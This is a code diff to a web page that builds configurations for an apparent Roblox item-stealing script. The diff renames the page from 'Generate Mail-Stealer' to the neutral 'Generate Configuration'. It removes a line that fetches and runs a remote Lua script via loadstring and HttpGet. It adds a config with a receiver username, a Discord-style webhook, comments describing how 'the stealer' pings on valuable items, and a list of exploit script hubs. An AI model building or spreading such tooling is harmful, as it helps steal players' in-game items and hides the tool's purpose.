@@ -18,7 +18,7 @@
 </head>
 <body>
   <div class="container">
-    <h1>Generate Mail-Stealer</h1>
+    <h1>Generate Configuration</h1>
     <div class="input-field">
       <label for="username">Username:</label>
       <input type="text" id="username" name="username">
@@ -26,6 +26,14 @@
     <div class="input-field">
       <label for="webhook">Webhook URL:</label>
       <input type="text" id="webhook" name="webhook">
+    </div>
+    <div class="input-field">
+      <label for="script">Script:</label>
+      <input type="text" id="script" name="script" placeholder="None">
+    </div>
+    <div class="input-field">
+      <label for="customLink">Custom Link:</label>
+      <input type="text" id="customLink" name="customLink" placeholder="None">
     </div>
     <button onclick="generateOutput()">Generate</button>
     <textarea id="output"></textarea>
@@ -36,9 +44,18 @@
     function generateOutput() {
         var username = document.getElementById("username").value;
         var webhook = document.getElementById("webhook").value;
-        var outputString = 'Username = "' + username + '"\n' +
-                           'webhook = "' + webhook + '"\n' +
-                           'loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/pets9.lua"))()';
+        var script = document.getElementById("script").value || "None";
+        var customLink = document.getElementById("customLink").value || "None";
+        
+        var outputString = `Config = {
+    Receivers = {"${username}"}, -- {"ROBLOX"} or {"ROBLOX", "ROBLOX1", "ROBLOX2"}
+    Webhook = "${webhook}",
+    FullInventory = true, -- If true, it will display all of the player's items.
+    GoodItemsOnly = true, -- If set to true, the stealer will not ping you if the player only has items below legendary.
+    ResendTrade = "gg", -- Send this in chat to resend the trade request if you don't receive it.
+    Script = "${script}", -- Scripts > "None", "Custom", "Overdrive H", "Symphony Hub", "Highlight Hub", "Eclipse Hub", "R3TH PRIV", "AshbornnHub", "Nexus"
+    CustomLink = "${customLink}" -- If Script is set to Custom, provide the custom URL here.
+}`;
         document.getElementById("output").value = outputString;
         hljs.highlightAll();
     }
